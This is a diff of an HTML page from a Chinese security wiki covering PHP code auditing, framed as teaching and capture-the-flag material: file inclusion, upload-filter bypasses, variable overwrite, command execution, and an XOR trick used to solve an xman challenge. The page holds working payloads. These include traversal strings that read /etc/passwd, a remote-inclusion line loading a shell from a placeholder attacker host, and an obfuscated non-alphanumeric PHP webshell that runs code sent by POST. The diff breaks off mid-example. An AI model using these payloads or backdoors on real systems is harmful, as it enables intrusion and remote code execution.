+    <a href="../../../development/portal-faucet/" class="dropdown-item">ConfluxPortal切换为测试网领取测试币教程</a>
+</li>
+    </ul>
+  </li>
+                                </ul>
+                            </li>
+                            <li class="dropdown">
+                                <a href="#" class="nav-link dropdown-toggle" data-toggle="dropdown">Ecosystem <b class="caret"></b></a>
+                                <ul class="dropdown-menu">
+                                    
+<li>
+    <a href="../../../ecosystem/introduction/" class="dropdown-item">生态介绍</a>
+</li>
+                                    
+  <li class="dropdown-submenu">
+    <a href="#" class="dropdown-item">Conflux基础生态教程</a>
+    <ul class="dropdown-menu">
+            
+<li>
+    <a href="../../../ecosystem/wcfx-cfx-exchange/" class="dropdown-item">WCFX与CFX代币互换</a>
+</li>
+            
+<li>
+    <a href="../../../ecosystem/governance/" class="dropdown-item">Staking合约的质押与解质押</a>
+</li>
+    </ul>
+  </li>
+                                    
+  <li class="dropdown-submenu">
+    <a href="#" class="dropdown-item">常见生态介绍及教程</a>
+    <ul class="dropdown-menu">
+            
+<li>
+    <a href="../../../ecosystem/tspace/" class="dropdown-item">Tspace 4.0 NFT平台</a>
+</li>
+            
+<li>
+    <a href="../../../ecosystem/nft-box/" class="dropdown-item">NFTBox创新型资产交互平台</a>
+</li>
+            
+<li>
+    <a href="../../../ecosystem/shuttleflow/" class="dropdown-item">Shuttleflow跨链工具</a>
+</li>
+            
+<li>
+    <a href="../../../ecosystem/moonswap/" class="dropdown-item">moonswap生态</a>
+</li>
+            
+<li>
+    <a href="../../../ecosystem/phantom/" class="dropdown-item">Phantom协议</a>
+</li>
+            
+<li>
+    <a href="../../../ecosystem/dan/" class="dropdown-item">炼丹西游</a>
+</li>
+            
+<li>
+    <a href="../../../ecosystem/guguo/" class="dropdown-item">古国序列</a>
+</li>
+    </ul>
+  </li>
+                                </ul>
+                            </li>
+                            <li class="dropdown active">
+                                <a href="#" class="nav-link dropdown-toggle" data-toggle="dropdown">Web <b class="caret"></b></a>
+                                <ul class="dropdown-menu">
+                                    
+<li>
+    <a href="../../introduction/" class="dropdown-item">Web 简介</a>
+</li>
+                                    
+  <li class="dropdown-submenu">
+    <a href="#" class="dropdown-item">SQL 注入</a>
+    <ul class="dropdown-menu">
+            
+<li>
+    <a href="../../sqli/" class="dropdown-item">SQL 注入</a>
+</li>
+    </ul>
+  </li>
+                                    
+  <li class="dropdown-submenu">
+    <a href="#" class="dropdown-item">XSS 跨站脚本攻击</a>
+    <ul class="dropdown-menu">
+            
+<li>
+    <a href="../../xss/" class="dropdown-item">XSS</a>
+</li>
+    </ul>
+  </li>
+                                    
+  <li class="dropdown-submenu">
+    <a href="#" class="dropdown-item">CSRF 跨站请求伪造</a>
+    <ul class="dropdown-menu">
+            
+<li>
+    <a href="../../csrf/" class="dropdown-item">CSRF</a>
+</li>
+    </ul>
+  </li>
+                                    
+  <li class="dropdown-submenu">
+    <a href="#" class="dropdown-item">SSRF 服务端请求伪造</a>
+    <ul class="dropdown-menu">
+            
+<li>
+    <a href="../../ssrf/" class="dropdown-item">SSRF</a>
+</li>
+    </ul>
+  </li>
+                                    
+  <li class="dropdown-submenu">
+    <a href="#" class="dropdown-item">PHP 代码审计</a>
+    <ul class="dropdown-menu">
+            
+<li>
+    <a href="./" class="dropdown-item active">PHP 代码审计</a>
+</li>
+    </ul>
+  </li>
+                                </ul>
+                            </li>
+                            <li class="dropdown">
+                                <a href="#" class="nav-link dropdown-toggle" data-toggle="dropdown">BlockChain <b class="caret"></b></a>
+                                <ul class="dropdown-menu">
+                                    
+<li>
+    <a href="../../../blockchain/introduction/" class="dropdown-item">BlockChain Security Overview</a>
+</li>
+                                    
+  <li class="dropdown-submenu">
+    <a href="#" class="dropdown-item">Ethereum Security</a>
+    <ul class="dropdown-menu">
+            
+<li>
+    <a href="../../../blockchain/ethereum/introduction/" class="dropdown-item">Ethereum Overview</a>
+</li>
+            
+<li>
+    <a href="../../../blockchain/ethereum/basics/" class="dropdown-item">Ethereum Basics</a>
+</li>
+            
+<li>
+    <a href="../../../blockchain/ethereum/selector-encoding/" class="dropdown-item">Function Selector and Argument Encoding</a>
+</li>
+            
+<li>
+    <a href="../../../blockchain/ethereum/storage/" class="dropdown-item">Ethereum Storage</a>
+</li>
+            
+<li>
+    <a href="../../../blockchain/ethereum/opcodes/" class="dropdown-item">Ethereum Opcodes</a>
+</li>
+            
+  <li class="dropdown-submenu">
+    <a href="#" class="dropdown-item">Known Attacks</a>
+    <ul class="dropdown-menu">
+            
+<li>
+    <a href="../../../blockchain/ethereum/attacks/introduction/" class="dropdown-item">Introduction</a>
+</li>
+            
+<li>
+    <a href="../../../blockchain/ethereum/attacks/re-entrancy/" class="dropdown-item">Re-Entrancy</a>
+</li>
+            
+<li>
+    <a href="../../../blockchain/ethereum/attacks/overflow-underflow/" class="dropdown-item">Integer Overflow and Underflow</a>
+</li>
+            
+<li>
+    <a href="../../../blockchain/ethereum/attacks/randomness/" class="dropdown-item">Randomness</a>
+</li>
+            
+<li>
+    <a href="../../../blockchain/ethereum/attacks/airdrop-hunting/" class="dropdown-item">Airdrop Hunting</a>
+</li>
+            
+<li>
+    <a href="../../../blockchain/ethereum/attacks/shortaddress/" class="dropdown-item">Short Address Attack</a>
+</li>
+            
+<li>
+    <a href="../../../blockchain/ethereum/attacks/delegatecall/" class="dropdown-item">Delegatecall</a>
+</li>
+            
+<li>
+    <a href="../../../blockchain/ethereum/attacks/uninitialized-storage-pointer/" class="dropdown-item">Uninitialized Storage Pointer</a>
+</li>
+            
+<li>
+    <a href="../../../blockchain/ethereum/attacks/arbitrarywrite/" class="dropdown-item">Arbitrary Writing</a>
+</li>
+            
+<li>
+    <a href="../../../blockchain/ethereum/attacks/create2/" class="dropdown-item">CREATE2</a>
+</li>
+            
+<li>
+    <a href="../../../blockchain/ethereum/attacks/jump-oriented-programming/" class="dropdown-item">Jump Oriented Programming</a>
+</li>
+    </ul>
+  </li>
+            
+<li>
+    <a href="../../../blockchain/ethereum/reverse/" class="dropdown-item">Smart Contract Reverse</a>
+</li>
+            
+<li>
+    <a href="../../../blockchain/ethereum/challenges/" class="dropdown-item">区块链比赛题目</a>
+</li>
+            
+<li>
+    <a href="../../../blockchain/ethereum/resources/" class="dropdown-item">学习资源</a>
+</li>
+    </ul>
+  </li>
+                                    
+  <li class="dropdown-submenu">
+    <a href="#" class="dropdown-item">Public Blockchain Security</a>
+    <ul class="dropdown-menu">
+            
+<li>
+    <a href="../../../blockchain/publicblockchain/introduction/" class="dropdown-item">Public Blockchain Security Overview</a>
+</li>
+    </ul>
+  </li>
+                                </ul>
+                            </li>
+                            <li class="dropdown">
+                                <a href="#" class="nav-link dropdown-toggle" data-toggle="dropdown">NFT <b class="caret"></b></a>
+                                <ul class="dropdown-menu">
+                                    
+<li>
+    <a href="../../../nft/introduction/" class="dropdown-item">初识NFT</a>
+</li>
+                                </ul>
+                            </li>
+                        </ul>
+
+                    <ul class="nav navbar-nav ml-auto">
+                        <li class="nav-item">
+                            <a href="#" class="nav-link" data-toggle="modal" data-target="#mkdocs_search_modal">
+                                <i class="fa fa-search"></i> Search
+                            </a>
+                        </li>
+                            <li class="nav-item">
+                                <a rel="prev" href="../../ssrf/" class="nav-link">
+                                    <i class="fa fa-arrow-left"></i> Previous
+                                </a>
+                            </li>
+                            <li class="nav-item">
+                                <a rel="next" href="../../../blockchain/introduction/" class="nav-link">
+                                    Next <i class="fa fa-arrow-right"></i>
+                                </a>
+                            </li>
+                            <li class="nav-item">
+                                <a href="https://github.com/conflux-wiki/conflux-wiki/blob/master/docs/zh/docs/web/php/php.md" class="nav-link">Edit on conflux-wiki/conflux-wiki</a>
+                            </li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+
+        <div class="container">
+            <div class="row">
+                    <div class="col-md-3"><div class="navbar-light navbar-expand-md bs-sidebar hidden-print affix" role="complementary">
+    <div class="navbar-header">
+        <button type="button" class="navbar-toggler collapsed" data-toggle="collapse" data-target="#toc-collapse" title="Table of Contents">
+            <span class="fa fa-angle-down"></span>
+        </button>
+    </div>
+
+    
+    <div id="toc-collapse" class="navbar-collapse collapse card bg-secondary">
+        <ul class="nav flex-column">
+            
+            <li class="nav-item" data-level="1"><a href="#php" class="nav-link">PHP 代码审计</a>
+              <ul class="nav flex-column">
+            <li class="nav-item" data-level="2"><a href="#_1" class="nav-link">文件包含</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+            <li class="nav-item" data-level="2"><a href="#_4" class="nav-link">文件上传</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+            <li class="nav-item" data-level="2"><a href="#_6" class="nav-link">变量覆盖</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+            <li class="nav-item" data-level="2"><a href="#_8" class="nav-link">命令执行</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+            <li class="nav-item" data-level="2"><a href="#php_1" class="nav-link">PHP 特性</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+            <li class="nav-item" data-level="2"><a href="#_19" class="nav-link">寻找源代码备份</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+              </ul>
+            </li>
+        </ul>
+    </div>
+</div></div>
+                    <div class="col-md-9" role="main">
+
+<h1 id="php">PHP 代码审计<a class="headerlink" href="#php" title="Permanent link">&para;</a></h1>
+<h2 id="_1">文件包含<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<p>常见的导致文件包含的函数有：</p>
+<ul>
+<li>PHP：<code>include()</code>，<code>include_once()</code>，<code>require()</code>，<code>require_once()</code>，<code>fopen()</code>，<code>readfile()</code> 等</li>
+<li>JSP Servlet：<code>ava.io.File()</code>，<code>java.io.FileReader()</code> 等</li>
+<li>ASP：<code>includefile</code>，<code>includevirtual</code> 等</li>
+</ul>
+<p>当 PHP 包含一个文件时，会将该文件当做 PHP 代码执行，而不会在意文件时什么类型。</p>
+<h3 id="_2">本地文件包含<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h3>
+<p>本地文件包含，Local File Inclusion，LFI。</p>
+<pre class="highlight"><code class="language-php">&lt;?php
+$file = $_GET['file'];
+if (file_exists('/home/wwwrun/'.$file.'.php')) {
+  include '/home/wwwrun/'.$file.'.php';
+}
+?&gt;</code></pre>
+<p>上述代码存在本地文件包含，可用 %00 截断的方式读取 <code>/etc/passwd</code> 文件内容。</p>
+<ul>
+<li><code>%00</code> 截断</li>
+</ul>
+<pre class="highlight"><code>?file=../../../../../../../../../etc/passwd%00</code></pre>
+<p>需要 <code>magic_quotes_gpc=off</code>，PHP 小于 5.3.4 有效。</p>
+<ul>
+<li>路径长度截断</li>
+</ul>
+<pre class="highlight"><code>?file=../../../../../../../../../etc/passwd/././././././.[…]/./././././.</code></pre>
+<p>Linux 需要文件名长于 4096，Windows 需要长于 256。</p>
+<ul>
+<li>点号截断</li>
+</ul>
+<pre class="highlight"><code>?file=../../../../../../../../../boot.ini/………[…]…………</code></pre>
+<p>只适用 Windows，点号需要长于 256。</p>
+<h3 id="_3">远程文件包含<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h3>
+<p>远程文件包含，Remote File Inclusion，RFI。</p>
+<pre class="highlight"><code class="language-php">&lt;?php
+if ($route == "share") {
+  require_once $basePath . "/action/m_share.php";
+} elseif ($route == "sharelink") {
+  require_once $basePath . "/action/m_sharelink.php";
+}</code></pre>
+<p>构造变量 <code>basePath</code> 的值。</p>
+<pre class="highlight"><code>/?basePath=http://attacker/phpshell.txt?</code></pre>
+<p>最终的代码执行了</p>
+<pre class="highlight"><code class="language-php">require_once "http://attacker/phpshell.txt?/action/m_share.php";</code></pre>
+<p>问号后的部分被解释为 URL 的 querystring，这也是一种「截断」。</p>
+<ul>
+<li>普通远程文件包含</li>
+</ul>
+<pre class="highlight"><code>?file=[http|https|ftp]://example.com/shell.txt</code></pre>
+<p>需要 <code>allow_url_fopen=On</code> 并且 <code>allow_url_include=On</code> 。</p>
+<ul>
+<li>利用 PHP 流 input</li>
+</ul>
+<pre class="highlight"><code>?file=php://input</code></pre>
+<p>需要 <code>allow_url_include=On</code> 。</p>
+<ul>
+<li>利用 PHP 流 filter</li>
+</ul>
+<pre class="highlight"><code>?file=php://filter/convert.base64-encode/resource=index.php</code></pre>
+<p>需要 <code>allow_url_include=On</code> 。</p>
+<ul>
+<li>利用 data URIs</li>
+</ul>
+<pre class="highlight"><code>?file=data://text/plain;base64,SSBsb3ZlIFBIUAo=</code></pre>
+<p>需要 <code>allow_url_include=On</code> 。</p>
+<ul>
+<li>利用 XSS 执行</li>
+</ul>
+<pre class="highlight"><code>?file=http://127.0.0.1/path/xss.php?xss=phpcode</code></pre>
+<p>需要 <code>allow_url_fopen=On</code>，<code>allow_url_include=On</code> 并且防火墙或者白名单不允许访问外网时，先在同站点找一个 XSS 漏洞，包含这个页面，就可以注入恶意代码了。</p>
+<h2 id="_4">文件上传<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h2>
+<p>文件上传漏洞是指用户上传了一个可执行脚本文件，并通过此文件获得了执行服器端命令的能力。在大多数情况下，文件上传漏洞一般是指上传 WEB 脚本能够被服务器解析的问题，也就是所谓的 webshell 问题。完成这一攻击需要这样几个条件，一是上传的文件能够被 WEB 容器执行，其次用户能从 WEB 上访问这个文件，最后，如果上传的文件被安全检查、格式化、图片压缩等功能改变了内容，则可能导致攻击失败。</p>
+<h3 id="_5">绕过上传检查<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h3>
+<ul>
+<li>前端检查扩展名</li>
+</ul>
+<p>抓包绕过即可。</p>
+<ul>
+<li><code>Content-Type</code> 检测文件类型</li>
+</ul>
+<p>抓包修改 <code>Content-Type</code> 类型，使其符合白名单规则。</p>
+<ul>
+<li>服务端添加后缀</li>
+</ul>
+<p>尝试 <code>%00</code> 截断。</p>
+<ul>
+<li>服务端扩展名检测</li>
+</ul>
+<p>利用解析漏洞。</p>
+<ul>
+<li>Apache 解析</li>
+</ul>
+<p>Apache 对后缀解析是从右向左的</p>
+<p><code>phpshell.php.rar.rar.rar.rar</code> 因为 Apache 不认识 <code>.rar</code> 这个文件类型，所以会一直遍历后缀到 <code>.php</code>，然后认为这是一个 PHP 文件。</p>
+<ul>
+<li>IIS 解析</li>
+</ul>
+<p>IIS 6 下当文件名为 <code>abc.asp;xx.jpg</code> 时，会将其解析为 <code>abc.asp</code>。</p>
+<ul>
+<li>PHP CGI 路径解析</li>
+</ul>
+<p>当访问 <code>http://www.a.com/path/test.jpg/notexist.php</code> 时，会将 <code>test.jpg</code> 当做 PHP 解析， <code>notexist.php</code> 是不存在的文件。此时 Nginx 的配置如下</p>
+<pre class="highlight"><code class="language-nginx">location ~ \.php$ {
+  root html;
+  fastcgi_pass 127.0.0.1:9000;
+  fastcgi_index index.php;
+  fastcgi_param SCRIPT_FILENAME /scripts$fastcgi_script_name;
+  include fastcgi_param;
+}</code></pre>
+<ul>
+<li>其他方式</li>
+</ul>
+<p>后缀大小写、双写、特殊后缀如 <code>php5</code> 等，修改包内容的大小写过 WAF 等。</p>
+<h2 id="_6">变量覆盖<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h2>
+<h3 id="_7">全局变量覆盖<a class="headerlink" href="#_7" title="Permanent link">&para;</a></h3>
+<p>变量如果未被初始化，且能够被用户所控制，那么很可能会导致安全问题。</p>
+<pre class="highlight"><code class="language-ini">register_globals=ON</code></pre>
+<p>示例</p>
+<pre class="highlight"><code class="language-php">&lt;?php
+echo "Register_globals: " . (int)ini_get("register_globals") . "&lt;br/&gt;";
+
+if ($auth) {
+  echo "private!";
+}
+?&gt;</code></pre>
+<p>当 <code>register_globals=ON</code> 时，提交 <code>test.php?auth=1</code>，<code>auth</code> 变量将自动得到赋值。</p>
+<h3 id="extract"><code>extract()</code> 变量覆盖<a class="headerlink" href="#extract" title="Permanent link">&para;</a></h3>
+<p><code>extract()</code> 函数能够将变量从数组导入到当前的符号表，其定义为</p>
+<pre class="highlight"><code>int extract ( array $var_array [, int $extract_type [, string $prefix ]] )</code></pre>
+<p>其中，第二个参数指定函数将变量导入符号表时的行为，最常见的两个值是 <code>EXTR_OVERWRITE</code> 和 <code>EXTR_SKIP</code>。</p>
+<p>当值为 <code>EXTR_OVERWRITE</code> 时，在将变量导入符号表的过程中，如果变量名发生冲突，则覆盖所有变量；值为 <code>EXTR_SKIP</code> 则表示跳过不覆盖。若第二个参数未指定，则在默认情况下使用 <code>EXTR_OVERWRITE</code>。</p>
+<pre class="highlight"><code class="language-php">&lt;?php
+$auth = "0";
+extract($_GET);
+
+if ($auth == 1) {
+  echo "private!";
+} else {
+  echo "public!";
+}
+?&gt;</code></pre>
+<p>当 <code>extract()</code> 函数从用户可以控制的数组中导出变量时，可能发生变量覆盖。</p>
+<h3 id="import_request_variables"><code>import_request_variables</code> 变量覆盖<a class="headerlink" href="#import_request_variables" title="Permanent link">&para;</a></h3>
+<pre class="highlight"><code>bool import_request_variables (string $types [, string $prefix])</code></pre>
+<p><code>import_request_variables</code> 将 GET、POST、Cookies 中的变量导入到全局，使用这个函数只用简单地指定类型即可。</p>
+<pre class="highlight"><code class="language-php">&lt;?php
+$auth = "0";
+import_request_variables("G");
+
+if ($auth == 1) {
+  echo "private!";
+} else {
+  echo "public!";
+}
+?&gt;</code></pre>
+<p><code>import_request_variables("G")</code> 指定导入 GET 请求中的变量，提交 <code>test.php?auth=1</code> 出现变量覆盖。</p>
+<h3 id="parse_str"><code>parse_str()</code> 变量覆盖<a class="headerlink" href="#parse_str" title="Permanent link">&para;</a></h3>
+<pre class="highlight"><code>void parse_str ( string $str [, array &amp;$arr ])</code></pre>
+<p><code>parse_str()</code> 函数通常用于解析 URL 中的 querystring，但是当参数值可以被用户控制时，很可能导致变量覆盖。</p>
+<pre class="highlight"><code class="language-php">// var.php?var=new  变量覆盖
+$var = "init";
+parse_str($_SERVER["QUERY_STRING"]);
+print $var;</code></pre>
+<p>与 <code>parse_str()</code> 类似的函数还有 <code>mb_parse_str()</code>。</p>
+<h2 id="_8">命令执行<a class="headerlink" href="#_8" title="Permanent link">&para;</a></h2>
+<h3 id="_9">直接执行代码<a class="headerlink" href="#_9" title="Permanent link">&para;</a></h3>
+<p>PHP 中有不少可以直接执行代码的函数。</p>
+<pre class="highlight"><code class="language-php">eval();
+assert();
+system();
+exec();
+shell_exec();
+passthru();
+escapeshellcmd();
+pcntl_exec();
+......</code></pre>
+<h3 id="preg_replace"><code>preg_replace()</code> 代码执行<a class="headerlink" href="#preg_replace" title="Permanent link">&para;</a></h3>
+<p><code>preg_replace()</code> 的第一个参数如果存在 <code>/e</code> 模式修饰符，则允许代码执行。</p>
+<pre class="highlight"><code class="language-php">&lt;?php
+$var = "&lt;tag&gt;phpinfo()&lt;/tag&gt;";
+preg_replace("/&lt;tag&gt;(.*?)&lt;\/tag&gt;/e", "addslashes(\\1)", $var);
+?&gt;</code></pre>
+<p>如果没有 <code>/e</code> 修饰符，可以尝试 %00 截断。</p>
+<h3 id="preg_match"><code>preg_match</code> 代码执行<a class="headerlink" href="#preg_match" title="Permanent link">&para;</a></h3>
+<p><code>preg_match</code> 执行的是匹配正则表达式，如果匹配成功，则允许代码执行。</p>
+<pre class="highlight"><code>&lt;?php
+include 'flag.php';
+if(isset($_GET['code'])){
+    $code = $_GET['code'];
     if(strlen($code)&gt;40){
-        die(&quot;Long.&quot;);
+        die("Long.");
     }
-    if(preg_match(&quot;/[A-Za-z0-9]+/&quot;,$code)){
-        die(&quot;NO.&quot;);
+    if(preg_match("/[A-Za-z0-9]+/",$code)){
+        die("NO.");
     }
     @eval($code);
 }else{
     highlight_file(__FILE__);
 }
-//$hint =  &quot;php function getFlag() to get flag&quot;;
-?&gt;
-</code></pre></div> <p>这道题是 <code>xman</code> 训练赛的时候，梅子酒师傅出的一道题。这一串代码描述是这样子，我们要绕过 <code>A-Z</code>、<code>a-z</code>、<code>0-9</code> 这些常规数字、字母字符串的传参，将非字母、数字的字符经过各种变换，最后能构造出 <code>a-z</code> 中任意一个字符，并且字符串长度小于 <code>40</code> 。然后再利用 <code>PHP</code> 允许动态函数执行的特点，拼接出一个函数名，这里我们是 <code>getFlag</code>，然后动态执行该代码即可。</p> <p>那么，我们需要考虑的问题是如何通过各种变换，使得我们能够去成功读取到 <code>getFlag</code> 函数，然后拿到 <code>webshell</code> 。</p> <p>在理解这个之前，我们首先需要大家了解的是 <code>PHP</code> 中异或 <code>^</code> 的概念。</p> <p>我们先看一下下面这段代码：</p> <div class=highlight><pre><span></span><code>&lt;?php
-    echo &quot;A&quot;^&quot;?&quot;;
-?&gt;
-</code></pre></div> <p>运行结果如下：</p> <p><img alt src=../figure/preg_match/answer1.png></p> <p>我们可以看到，输出的结果是字符 <code>~</code>。之所以会得到这样的结果，是因为代码中对字符 <code>A</code> 和字符 <code>?</code> 进行了异或操作。在 <code>PHP</code> 中，两个变量进行异或时，先会将字符串转换成 <code>ASCII</code> 值，再将 <code>ASCII</code> 值转换成二进制再进行异或，异或完，又将结果从二进制转换成了 <code>ASCII</code> 值，再将 <code>ASCII</code> 值转换成字符串。异或操作有时也被用来交换两个变量的值。</p> <p>比如像上面这个例子</p> <p><code>A</code> 的 <code>ASCII</code> 值是 <code>65</code> ，对应的二进制值是 <code>01000001</code></p> <p><code>?</code> 的ASCII值是 <code>63</code> ，对应的二进制值是 <code>00111111</code></p> <p>异或的二进制的值是 <code>‭01111110‬</code> ，对应的 <code>ASCII</code> 值是 <code>126</code> ，对应的字符串的值就是 <code>~</code> 了</p> <p>我们都知道， <code>PHP</code> 是弱类型的语言，也就是说在 <code>PHP</code> 中我们可以不预先声明变量的类型，而直接声明一个变量并进行初始化或赋值操作。正是由于 <code>PHP</code> 弱类型的这个特点，我们对 <code>PHP</code> 的变量类型进行隐式的转换，并利用这个特点进行一些非常规的操作。如将整型转换成字符串型，将布尔型当作整型，或者将字符串当作函数来处理，下面我们来看一段代码：</p> <div class=highlight><pre><span></span><code>&lt;?php
+//$hint =  "php function getFlag() to get flag";
+?&gt;</code></pre>
+<p>这道题是 <code>xman</code> 训练赛的时候，梅子酒师傅出的一道题。这一串代码描述是这样子，我们要绕过 <code>A-Z</code>、<code>a-z</code>、<code>0-9</code> 这些常规数字、字母字符串的传参，将非字母、数字的字符经过各种变换，最后能构造出 <code>a-z</code> 中任意一个字符，并且字符串长度小于 <code>40</code> 。然后再利用 <code>PHP</code> 允许动态函数执行的特点，拼接出一个函数名，这里我们是 <code>getFlag</code>，然后动态执行该代码即可。</p>
+<p>那么，我们需要考虑的问题是如何通过各种变换，使得我们能够去成功读取到 <code>getFlag</code> 函数，然后拿到 <code>webshell</code> 。</p>
+<p>在理解这个之前，我们首先需要大家了解的是 <code>PHP</code> 中异或 <code>^</code> 的概念。</p>
+<p>我们先看一下下面这段代码：</p>
+<pre class="highlight"><code>&lt;?php
+    echo "A"^"?";
+?&gt;</code></pre>
+<p>运行结果如下：</p>
+<p><img alt="" src="../figure/preg_match/answer1.png" /></p>
+<p>我们可以看到，输出的结果是字符 <code>~</code>。之所以会得到这样的结果，是因为代码中对字符 <code>A</code> 和字符 <code>?</code> 进行了异或操作。在 <code>PHP</code> 中，两个变量进行异或时，先会将字符串转换成 <code>ASCII</code> 值，再将 <code>ASCII</code> 值转换成二进制再进行异或，异或完，又将结果从二进制转换成了 <code>ASCII</code> 值，再将 <code>ASCII</code> 值转换成字符串。异或操作有时也被用来交换两个变量的值。</p>
+<p>比如像上面这个例子</p>
+<p><code>A</code> 的 <code>ASCII</code> 值是 <code>65</code> ，对应的二进制值是 <code>01000001</code></p>
+<p><code>?</code> 的ASCII值是 <code>63</code> ，对应的二进制值是 <code>00111111</code></p>
+<p>异或的二进制的值是 <code>‭01111110‬</code> ，对应的 <code>ASCII</code> 值是 <code>126</code> ，对应的字符串的值就是 <code>~</code> 了</p>
+<p>我们都知道， <code>PHP</code> 是弱类型的语言，也就是说在 <code>PHP</code> 中我们可以不预先声明变量的类型，而直接声明一个变量并进行初始化或赋值操作。正是由于 <code>PHP</code> 弱类型的这个特点，我们对 <code>PHP</code> 的变量类型进行隐式的转换，并利用这个特点进行一些非常规的操作。如将整型转换成字符串型，将布尔型当作整型，或者将字符串当作函数来处理，下面我们来看一段代码：</p>
+<pre class="highlight"><code>&lt;?php
     function B(){
-        echo &quot;Hello Angel_Kitty&quot;;
+        echo "Hello Angel_Kitty";
     }
     $_++;
-    $__= &quot;?&quot; ^ &quot;}&quot;;
+    $__= "?" ^ "}";
     $__();
-?&gt;
-</code></pre></div> <p>代码执行结果如下：</p> <p><img alt src=../figure/preg_match/answer2.png></p> <p>我们一起来分析一下上面这段代码：</p> <p>1、<code>$_++;</code> 这行代码的意思是对变量名为 <code>"_"</code> 的变量进行自增操作，在 <code>PHP</code> 中未定义的变量默认值 <code>null</code> ，<code>null==false==0</code> ，我们可以在不使用任何数字的情况下，通过对未定义变量的自增操作来得到一个数字。</p> <p>2、<code>$__="?" ^ "}";</code> 对字符 <code>?</code> 和 <code>}</code> 进行异或运算，得到结果 <code>B</code> 赋给变量名为 <code>__</code> (两个下划线)的变量</p> <p>3、<code>$ __ ();</code> 通过上面的赋值操作，变量 <code>$__</code> 的值为 <code>B</code> ，所以这行可以看作是 <code>B()</code> ，在 <code>PHP</code> 中，这行代码表示调用函数 <code>B</code> ，所以执行结果为 <code>Hello Angel_Kitty</code> 。在 <code>PHP</code> 中，我们可以将字符串当作函数来处理。</p> <p>看到这里，相信大家如果再看到类似的 <code>PHP</code> 后门应该不会那么迷惑了，你可以通过一句句的分析后门代码来理解后门想实现的功能。</p> <p>我们希望使用这种后门创建一些可以绕过检测的并且对我们有用的字符串，如 <code>_POST</code> ， <code>system</code> ， <code>call_user_func_array</code>，或者是任何我们需要的东西。</p> <p>下面是个非常简单的非数字字母的 <code>PHP</code> 后门：</p> <div class=highlight><pre><span></span><code>&lt;?php
+?&gt;</code></pre>
+<p>代码执行结果如下：</p>
+<p><img alt="" src="../figure/preg_match/answer2.png" /></p>
+<p>我们一起来分析一下上面这段代码：</p>
+<p>1、<code>$_++;</code> 这行代码的意思是对变量名为 <code>"_"</code> 的变量进行自增操作，在 <code>PHP</code> 中未定义的变量默认值 <code>null</code> ，<code>null==false==0</code> ，我们可以在不使用任何数字的情况下，通过对未定义变量的自增操作来得到一个数字。</p>
+<p>2、<code>$__="?" ^ "}";</code> 对字符 <code>?</code> 和 <code>}</code> 进行异或运算，得到结果 <code>B</code> 赋给变量名为 <code>__</code> (两个下划线)的变量</p>
+<p>3、<code>$ __ ();</code> 通过上面的赋值操作，变量 <code>$__</code> 的值为 <code>B</code> ，所以这行可以看作是 <code>B()</code> ，在 <code>PHP</code> 中，这行代码表示调用函数 <code>B</code> ，所以执行结果为 <code>Hello Angel_Kitty</code> 。在 <code>PHP</code> 中，我们可以将字符串当作函数来处理。</p>
+<p>看到这里，相信大家如果再看到类似的 <code>PHP</code> 后门应该不会那么迷惑了，你可以通过一句句的分析后门代码来理解后门想实现的功能。</p>
+<p>我们希望使用这种后门创建一些可以绕过检测的并且对我们有用的字符串，如 <code>_POST</code> ， <code>system</code> ， <code>call_user_func_array</code>，或者是任何我们需要的东西。</p>
+<p>下面是个非常简单的非数字字母的 <code>PHP</code> 后门：</p>
+<pre class="highlight"><code>&lt;?php
     @$_++; // $_ = 1
-    $__=(&quot;#&quot;^&quot;|&quot;); // $__ = _
-    $__.=(&quot;.&quot;^&quot;~&quot;); // _P
-    $__.=(&quot;/&quot;^&quot;`&quot;); // _PO
-    $__.=(&quot;|&quot;^&quot;/&quot;); // _POS
-    $__.=(&quot;{&quot;^&quot;/&quot;); // _POST 
+    $__=("#"^"|"); // $__ = _
+    $__.=("."^"~"); // _P
+    $__.=("/"^"`"); // _PO
+    $__.=("|"^"/"); // _POS
+    $__.=("{"^"/"); // _POST 
     ${$__}[!$_](${$__}[$_]); // $_POST[0]($_POST[1]);
-?&gt;
-</code></pre></div> <p>在这里我说明下， <code>.=</code> 是字符串的连接，具体参看 <code>PHP</code> 语法</p> <p>我们甚至可以将上面的代码合并为一行，从而使程序的可读性更差，代码如下：</p> <div class=highlight><pre><span></span><code>$__=(&quot;#&quot;^&quot;|&quot;).(&quot;.&quot;^&quot;~&quot;).(&quot;/&quot;^&quot;`&quot;).(&quot;|&quot;^&quot;/&quot;).(&quot;{&quot;^&quot;/&quot;);
-</code></pre></div> <p>我们回到 <code>xman</code> 训练赛的那题来看，我们的想法是通过构造异或来去绕过那串字符，那么我们该如何构造这个字串使得长度小于 <code>40</code> 呢？</p> <p>我们最终是要读取到那个 <code>getFlag</code> 函数，我们需要构造一个 <code>_GET</code> 来去读取这个函数，我们最终构造了如下字符串：</p> <p><img alt src=../figure/preg_match/payloads.png></p> <p>可能很多小伙伴看到这里仍然无法理解这段字符串是如何构造的吧，我们就对这段字符串进行段分析。</p> <h4 id=_get>构造 <code>_GET</code> 读取<a class=headerlink href=#_get title="Permanent link">&para;</a></h4> <p>首先我们得知道 <code>_GET</code> 由什么异或而来的，经过我的尝试与分析，我得出了下面的结论：</p> <div class=highlight><pre><span></span><code>&lt;?php
-    echo &quot;`{{{&quot;^&quot;?&lt;&gt;/&quot;;//_GET
-?&gt;
-</code></pre></div> <p>这段代码一大坨是啥意思呢？因为40个字符长度的限制，导致以前逐个字符异或拼接的webshell不能使用。<br> 这里可以使用php中可以执行命令的反引号 <code>`</code> 和 <code>Linux</code> 下面的通配符 <code>?</code></p> <ul> <li><code>?</code> 代表匹配一个字符</li> <li><code>`</code> 表示执行命令</li> <li><code>"</code> 对特殊字符串进行解析</li> </ul> <p>由于 <code>?</code> 只能匹配一个字符，这种写法的意思是循环调用，分别匹配。我们将其进行分解来看：</p> <div class=highlight><pre><span></span><code>&lt;?php
